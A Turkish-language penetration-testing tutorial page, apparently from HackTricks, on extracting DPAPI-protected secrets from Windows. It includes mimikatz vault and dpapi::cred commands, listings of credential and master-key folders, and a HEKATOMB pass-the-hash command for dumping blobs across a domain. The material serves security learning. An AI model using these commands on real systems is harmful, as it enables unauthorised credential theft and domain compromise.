# DPAPI - Şifreleri Çıkarma

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) **İspanya**'daki en önemli siber güvenlik etkinliği ve **Avrupa**'daki en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## DPAPI Nedir

Data Protection API (DPAPI), esasen Windows işletim sisteminde **asimetrik özel anahtarların simetrik şifrelemesi** için kullanılır ve kullanıcı veya sistem sırlarını önemli bir entropi kaynağı olarak kullanır. Bu yaklaşım, geliştiricilerin kullanıcıların oturum açma sırlarından veya sistem şifrelemesi için sistemin alan kimlik doğrulama sırlarından türetilen bir anahtar kullanarak verileri şifrelemelerine olanak tanıyarak şifrelemeyi basitleştirir; böylece geliştiricilerin şifreleme anahtarının korunmasını kendilerinin yönetmesine gerek kalmaz.

### DPAPI ile Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunmaktadır:

* Internet Explorer ve Google Chrome'un şifreleri ve otomatik tamamlama verileri
* Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap şifreleri
* Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için şifreler, şifreleme anahtarları dahil
* Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar için şifreler
* Credential Manager tarafından yönetilen ağ şifreleri ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler

## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kimlik Bilgisi Dosyaları

**Korunan kimlik bilgisi dosyaları** şunlarda bulunabilir:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Mimikatz `dpapi::cred` kullanarak kimlik bilgisi bilgilerini alın, yanıtında şifreli veriler ve guidMasterKey gibi ilginç bilgiler bulabilirsiniz.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz modülünü** `dpapi::cred` uygun `/masterkey` ile şifre çözmek için kullanabilirsiniz:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

DPAPI anahtarları, kullanıcının RSA anahtarlarını şifrelemek için `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada {SID}, o kullanıcının [**Güvenlik Tanımlayıcısı**](https://en.wikipedia.org/wiki/Security\_Identifier) **dır**. **DPAPI anahtarı, kullanıcıların özel anahtarlarını koruyan anahtar ile aynı dosyada saklanır**. Genellikle 64 bayt rastgele veriden oluşur. (Bu dizinin korunduğunu ve bu nedenle cmd'den `dir` kullanarak listeleyemeyeceğinizi, ancak PS'den listeleyebileceğinizi unutmayın).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bu, bir kullanıcının bir dizi Master Key'inin nasıl görüneceğidir:

![](<../../.gitbook/assets/image (1121).png>)

Genellikle **her master key, diğer içeriği şifrelemek için kullanılabilen şifreli bir simetrik anahtardır**. Bu nedenle, **şifreli Master Key'i çıkarmak**, daha sonra onunla şifrelenmiş **diğer içeriği** **şifrelemek** için ilginçtir.

### Master key çıkarma ve şifre çözme

Master key'i çıkarmak ve şifre çözmek için bir örnek için [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) gönderisini kontrol edin.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1), [@gentilkiwi](https://twitter.com/gentilkiwi)'nin [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projesinden bazı DPAPI işlevselliğinin C# portudur.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizininden tüm kullanıcılar ve bilgisayarların çıkarılmasını ve alan denetleyici yedek anahtarının RPC aracılığıyla çıkarılmasını otomatikleştiren bir araçtır. Script, ardından tüm bilgisayarların IP adreslerini çözecek ve tüm kullanıcıların tüm DPAPI blob'larını almak için tüm bilgisayarlarda smbclient gerçekleştirecek ve her şeyi alan yedek anahtarı ile şifre çözecektir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'dan çıkarılan bilgisayar listesi ile, onları bilmeseniz bile her alt ağı bulabilirsiniz!

"Çünkü Alan Yöneticisi hakları yeterli değil. Hepsini hackleyin."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dökebilir.

## Referanslar

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **İspanya'daki** en ilgili siber güvenlik etkinliği ve **Avrupa'daki** en önemli etkinliklerden biridir. **Teknik bilgiyi teşvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
